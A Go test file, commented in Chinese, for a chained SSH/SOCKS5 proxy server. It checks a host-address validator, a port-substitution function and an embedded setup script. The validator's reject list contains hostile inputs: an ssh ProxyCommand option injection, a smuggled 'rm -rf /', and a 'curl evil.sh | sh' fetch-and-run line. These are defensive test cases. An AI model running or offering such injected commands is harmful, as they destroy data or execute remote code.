package server

import (
	"strings"
	"testing"
)

// 链式代理的两个纯函数：地址校验与端口注入。
//
// 它们决定了「用户粘错东西」时会不会把奇怪参数传给 ssh，
// 以及界面选的端口能不能真的生效。

func TestChainHostPattern(t *testing.T) {
	ok := []string{
		"root@203.0.113.10",
		"ubuntu@vps.example.com",
		"root@[2001:db8::1]",
		"root@host-with-dash",
		"203.0.113.10",
		"user_name@10.0.0.1:2222",
	}
	for _, host := range ok {
		if !chainHostPattern.MatchString(host) {
			t.Errorf("应接受 %q", host)
		}
	}

	// 这些要么是「整条命令粘进来了」，要么是想注入 ssh 选项
	bad := []string{
		"",
		"-oProxyCommand=calc.exe",
		"root@host; rm -rf /",
		"root@host && curl evil.sh | sh",
		"root@host extra",
		"root@ho st",
	}
	for _, host := range bad {
		if chainHostPattern.MatchString(host) {
			t.Errorf("应拒绝 %q", host)
		}
	}
}

func TestWithChainPort(t *testing.T) {
	const script = "#!/usr/bin/env bash\nPORT=1080\nset -euo pipefail\n"

	if got := withChainPort(script, 1080); got != script {
		t.Error("默认端口不应改动脚本")
	}
	got := withChainPort(script, 2080)
	if !strings.Contains(got, "\nPORT=2080\n") {
		t.Errorf("端口未写入：%q", got)
	}
	if strings.Contains(got, "PORT=1080") {
		t.Error("旧端口仍然残留")
	}
	// 只改第一处，别把后面可能出现的同名文本一起改掉
	multi := "PORT=1080\nPORT=1080\n"
	if n := strings.Count(withChainPort(multi, 2080), "PORT=2080"); n != 1 {
		t.Errorf("应只替换一处，实际 %d 处", n)
	}
}

func TestChainScriptEmbedded(t *testing.T) {
	// 内嵌脚本必须真的打进二进制，否则界面上点「复制命令」会拿到空串
	if len(chainScript) < 1000 {
		t.Fatalf("内嵌脚本过短（%d 字节），构建时可能没同步 assets/vps-socks5.sh", len(chainScript))
	}
	if !strings.Contains(chainScript, "PORT=1080") {
		t.Error("内嵌脚本缺少 PORT=1080 默认值，端口注入会失效")
	}
}
